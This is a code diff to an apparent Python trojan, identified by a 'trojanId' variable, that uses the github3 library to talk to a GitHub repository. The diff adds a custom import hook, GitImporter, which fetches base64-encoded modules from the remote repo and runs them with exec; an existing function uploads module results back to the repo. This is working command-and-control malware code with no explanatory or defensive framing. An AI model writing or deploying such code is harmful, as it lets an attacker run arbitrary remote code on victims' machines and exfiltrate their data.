@@ -8,6 +8,10 @@ import sys
 import base64
 import json
 
+
+import types
+
+
 from github3 import login
 
 trojanId = "uniqueId"
@@ -66,4 +70,32 @@ def store_module_result(data):
     repo.create_file(remote_path, "Storing module result", base64.b64encode(data))
 
     return
+
+
+class GitImporter(object):
+    def __init__(self):
+        self.current_module_code = ""
+
+    def find_module(self, fullname, path=None):
+        if configured:
+            print("[*] Attempting to retrieve %s" % fullname)
+            new_library = get_file_contents("modules/%s" % fullname)
+
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                # tells interpreter the module has been found and it can then load it
+                return self
+
+        return None
+
+    def load_module(self, name):
+        # create a blank module
+        module = types.ModuleType(name)
+        # put code from module we found into our new blank module
+        exec(self.current_module_code, module.__dict__)
+        # insert new module into sys.modules so picked up by future import calls
+        sys.modules[name] = module
+
+        return module
+
 
